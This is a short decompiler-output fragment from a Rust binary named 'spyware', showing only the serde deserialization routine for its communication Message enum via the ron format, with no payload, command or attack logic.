__int64 __fastcall spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::Message>::deserialize(
        __int64 a1,
        __int64 a2)
{
  <&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_enum(a1, a2, aMessage, 7LL, &off_B90F0, 10LL);
  return a1;
}